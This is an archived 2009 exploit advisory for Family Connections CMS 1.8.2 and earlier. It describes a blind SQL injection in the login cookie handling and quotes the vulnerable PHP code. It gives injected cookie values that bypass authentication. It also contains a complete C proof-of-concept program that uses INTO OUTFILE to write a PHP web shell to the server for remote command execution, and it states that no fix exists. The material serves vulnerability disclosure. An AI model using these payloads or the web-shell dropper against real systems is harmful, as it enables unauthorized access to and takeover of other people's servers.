<html><head><title>Family Connections CMS <= 1.8.2 Blind SQL Injection Vulnerability</title></head><pre>*******   Salvatore &quot;drosophila&quot; Fresta   *******

[+] Application: Family Connections
[+] Version: &lt;= 1.8.2
[+] Website: http://www.familycms.com

[+] Bugs: [A] Blind SQL Injection

[+] Exploitation: Remote
[+] Date: 1 Apr 2009

[+] Discovered by: Salvatore &quot;drosophila&quot; Fresta
[+] Author: Salvatore &quot;drosophila&quot; Fresta
[+] Contact: e-mail: drosophilaxxx@gmail.com


*************************************************

[+] Menu

1) Bugs
2) Code
3) Fix


*************************************************

[+] Bugs


- [A] Blind SQL Injection

[-] File affected: inc/util_inc.php

Usually an SQL injection vulnerability located in the
authentication system allows a guest to bypass it, and
this is just what happens using the following cookie:

Cookie name: fcms_login_id
Cookie content: -1 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,'admin','password',12,13,14,15,16,17,18,19,20,21,22
Cookie server: localhost (change it)
Cookie path: /

Cookie name: fcms_login_uname
Cookie content: admin
Cookie server: localhost (change it)
Cookie path: /

Cookie name: fcms_login_pw
Cookie content: password
Cookie server: localhost (change it)
Cookie path: /

Anyway the values contained in the previous cookies 
are used also by other functions and queries and so 
is not possible to surf on the vulnerable website 
with such permissions because the CMS interrupts the 
sessions each time a SQL error is encountered.
For this reason the possibility to write the result 
of the SQL queries on the files is handy to bypass 
this limitation.

The follows is the vulnerable code:

...

elseif (isset($_COOKIE['fcms_login_id'])) {
	if (isLoggedIn($_COOKIE['fcms_login_id'], $_COOKIE['fcms_login_uname'], $_COOKIE['fcms_login_pw'])) {
		$_SESSION['login_id'] = $_COOKIE['fcms_login_id'];
		$_SESSION['login_uname'] = $_COOKIE['fcms_login_uname'];
		$_SESSION['login_pw'] = $_COOKIE['fcms_login_pw'];
	}
	
...

in util_inc.php:

function isLoggedIn ($userid, $username, $password) {
	$result = mysql_query(&quot;SELECT * FROM `fcms_users` WHERE `id` = $userid LIMIT 1&quot;) or die('&lt;h1&gt;Login Error (util.inc.php 275)&lt;/h1&gt;' . mysql_error());
	if (mysql_num_rows($result) &gt; 0) {
		$r = mysql_fetch_array($result);
		if ($r['username'] !== $username) { return false; } elseif ($r['password'] !== $password) { return false; } else { return true; }
	} else {
		return false;
	}
}


*************************************************

[+] Code


- [A] Blind SQL Injection

/*

	Family Connections &lt;= 1.8.2 - Remote Command Execution
	
	Proof of Concept - Written by Salvatore &quot;drosophila&quot; Fresta

	The following software will create a file (rce.php) in the
	specified path using Blind SQL Injection bug. To exec remote
	commands, you must open the file using a browser.
	
*/	

#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;unistd.h&gt;
#include &lt;netdb.h&gt;

int socket_connect(char *server, int port) {

	int fd;
	struct sockaddr_in sock;
	struct hostent *host;
	
	memset(&amp;sock, 0, sizeof(sock));
	
	if((fd = socket(AF_INET, SOCK_STREAM, 0)) &lt; 0) return -1;
	
	sock.sin_family = AF_INET;
	sock.sin_port = htons(port);
	
	if(!(host=gethostbyname(server))) return -1;
	
	sock.sin_addr = *((struct in_addr *)host-&gt;h_addr);
	
	if(connect(fd, (struct sockaddr *) &amp;sock, sizeof(sock)) &lt; 0) return -1;
	
	return fd;
   
}

int socket_send(int socket, char *buffer, size_t size) {
	
	if(socket &lt; 0) return -1;

	return write(socket, buffer, size) &lt; 0 ? -1 : 0;
	
}

void usage(char *bn) {

	printf(&quot;\n\nFamily Connections &lt;= 1.8.2 - Remote Command Execution\n&quot;
			&quot;Proof of Concept - Written by Salvatore \&quot;drosophila\&quot; Fresta\n\n&quot;
			&quot;usage: %s &lt;server&gt; &lt;path&gt; &lt;fs path&gt;\n&quot;
			&quot;example: %s localhost /fcms/ /var/www/htdocs/fcms/\n\n&quot;, bn, bn);	

}

int main(int argc, char *argv[]) {
	
	int sd;
	char code[] = &quot;'&lt;?php echo \&quot;&lt;pre&gt;\&quot;%3b system($_GET[cmd])%3b echo \&quot;&lt;/pre&gt;&lt;br&gt;&lt;br&gt;\&quot;%3b?&gt;'&quot;,
		*buffer; 
	
	if(argc &lt; 4) {
		usage(argv[0]);
		return -1;
	}
	
	if(!(buffer = (char *)calloc(216+strlen(argv[1])+strlen(argv[2])+strlen(argv[3]), sizeof(char)))) {
		perror(&quot;calloc&quot;);
		return -1;
	}
	
	sprintf(buffer,	&quot;GET %shome.php HTTP/1.1\r\n&quot;
					&quot;Host: %s\r\n&quot;
					&quot;Cookie: fcms_login_id=-1 UNION ALL SELECT %s,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 INTO OUTFILE '%srce.php'#\r\n\r\n&quot;,
					argv[2], argv[1], code, argv[3]);
					
	printf(&quot;\n[*] Connecting...&quot;);
	
	if((sd = socket_connect(argv[1], 80)) &lt; 0) {
		perror(&quot;[-] Connection failed&quot;);
		free(buffer);
		return -1;
	}
	
	printf(&quot;\n[+] Connected&quot;
			&quot;\n[*] Sending...&quot;);
	
	if(socket_send(sd, buffer, strlen(buffer)) &lt; 0) {
		perror(&quot;[-] Sending failed&quot;);
		free(buffer);
		return -1;
	}
	
	printf(&quot;\n[+] Sent\n\n&quot;
			&quot;Open your browser and  try to connect to http://%s%srce.php?cmd=ls\n\n&quot;, argv[1], argv[2]);
			
	recv(sd, buffer, 1, 0);
	
	close(sd);
	free(buffer);
	
	printf(&quot;[+] Connection closed\n\n&quot;);
	
	return 0;
	
}


*************************************************

[+] Fix

No fix.


*************************************************

# milw0rm.com [2009-04-07]</pre></html>